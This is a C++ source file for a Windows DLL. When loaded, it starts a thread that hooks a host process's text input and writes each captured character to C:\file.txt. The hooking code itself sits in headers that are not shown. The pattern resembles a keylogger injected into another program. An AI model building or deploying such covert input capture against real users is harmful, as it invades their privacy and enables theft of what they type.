
#include <Windows.h>
#include <iostream>
#include <string>
#include <stdio.h>
#include <fstream>
#include "Comms/Comms.h"
#include "Hooks/Hooks.h"
#include "Data/Data.h"

int count = 0;
void MyTextInputFunc(wchar_t input) {
    std::ofstream myfile;
    myfile.open("C:\\file.txt");
    myfile << "InsertCount: " << count << std::endl;
    myfile << "Input: " << input << std::endl;
    myfile.close();
    count++;
}

DWORD WINAPI MainThread(HMODULE hModule){
    Comms* comms = new Comms();
    Hooks* hooks = new Hooks();
    Data* data = new Data();
    hooks->HookOnTextInput(MyTextInputFunc);

    while (true) {

        Sleep(1000);
    }
}
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CloseHandle(CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)MainThread, hModule, 0, nullptr));
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

